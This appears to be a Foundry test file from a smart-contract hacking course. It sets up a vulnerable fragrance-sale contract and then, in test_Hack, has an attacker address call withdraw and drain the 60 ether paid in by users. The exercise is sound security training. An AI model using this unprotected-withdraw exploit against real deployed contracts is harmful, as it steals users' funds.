// SCH Course Copyright Policy (C): DO-NOT-SHARE-WITH-ANYONE
// https://smartcontractshacking.com/#copyright-policy
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import {KilianExclusive} from "../../src/access-control-3/KilianExclusive.sol";

contract TestAC3 is Test {
    address deployer = makeAddr("deployer");
    address user1 = makeAddr("user1");
    address user2 = makeAddr("user2");
    address user3 = makeAddr("user3");
    address attacker = makeAddr("attacker");

    KilianExclusive kilianExclusive;

    uint256 constant FRAGRENCE_PRICE = 10 ether;

    function setUp() public {
        vm.deal(user1, FRAGRENCE_PRICE * 2);
        vm.deal(user2, FRAGRENCE_PRICE * 2);
        vm.deal(user3, FRAGRENCE_PRICE * 2);

        vm.startPrank(deployer);
        kilianExclusive = new KilianExclusive();

        // Add THE LIQUORS fragrences
        kilianExclusive.addFragrance("Apple Brandy");
        kilianExclusive.addFragrance("Angles' Share");
        kilianExclusive.addFragrance("Roses on Ice");
        kilianExclusive.addFragrance("Lheure Verte");

        // Add THE FRESH fragrences
        kilianExclusive.addFragrance("Moonligh in Heaven");
        kilianExclusive.addFragrance("Vodka on the Rocks");
        kilianExclusive.addFragrance("Flower of Immortality");
        kilianExclusive.addFragrance("Bamboo Harmony");

        kilianExclusive.flipSaleState();

        vm.stopPrank();

        vm.startPrank(user1);
        kilianExclusive.purchaseFragrance{value: FRAGRENCE_PRICE}(1);
        kilianExclusive.purchaseFragrance{value: FRAGRENCE_PRICE}(4);

        vm.stopPrank();

        vm.startPrank(user2);
        kilianExclusive.purchaseFragrance{value: FRAGRENCE_PRICE}(2);
        kilianExclusive.purchaseFragrance{value: FRAGRENCE_PRICE}(3);

        vm.stopPrank();
        vm.stopPrank();

        vm.startPrank(user3);
        kilianExclusive.purchaseFragrance{value: FRAGRENCE_PRICE}(5);
        kilianExclusive.purchaseFragrance{value: FRAGRENCE_PRICE}(8);

        vm.stopPrank();
    }

    function test_Hack() public {
        assertEq(address(kilianExclusive).balance, FRAGRENCE_PRICE * 6);

        vm.prank(attacker);
        kilianExclusive.withdraw(attacker);

        assertEq(address(attacker).balance, FRAGRENCE_PRICE * 6);
    }
}
